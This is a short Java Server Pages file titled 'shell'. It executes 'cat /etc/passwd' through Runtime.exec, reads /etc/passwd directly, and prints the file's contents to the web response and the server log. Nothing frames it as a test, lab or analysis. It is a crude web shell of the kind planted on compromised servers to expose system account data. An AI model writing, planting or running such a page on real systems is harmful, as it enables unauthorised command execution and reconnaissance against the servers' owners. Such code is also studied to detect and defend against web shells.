<%@ page language="java" import="java.io.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme() + "://"
+ request.getServerName() + ":" + request.getServerPort()
+ path + "/";
 
%>
<html>
<head>
<title>shell</title>
</head>
<body>
<%
String cmds = "monitor.sh";
try {
        Process process;  
        process = Runtime.getRuntime().exec("cat /etc/passwd");  

        BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream("/etc/passwd")));
        StringBuffer ret=new StringBuffer();
        String line = ""; 
        while ((line = br.readLine()) != null) {
                ret.append(line); 
        }    
        br.close();
        out.println("return:" + ret.toString()); 
        System.out.println("return:" + ret.toString()); 
 
} catch (Exception e) {
e.printStackTrace();
}
 
%>
 
</body>
</html> 
